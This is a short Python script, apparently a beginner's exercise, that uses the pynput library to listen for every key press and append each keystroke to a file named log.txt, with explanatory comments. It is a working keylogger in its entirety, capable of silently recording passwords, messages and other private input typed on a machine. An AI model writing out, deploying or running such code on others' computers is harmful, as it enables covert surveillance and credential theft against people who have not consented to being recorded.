from pynput.keyboard import Listener

def writeupfile(key):
    keydata = str(key)
    keydata = keydata.replace("'", "")
    # We created and appended a file with "log.txt"
    with open("log.txt", "a") as f:  # Used "with" because of automatic resource allocation and "a" for append
        f.write(keydata)  # Takes input from key

with Listener(on_press=writeupfile) as l:  # This activates "on press"
    l.join()
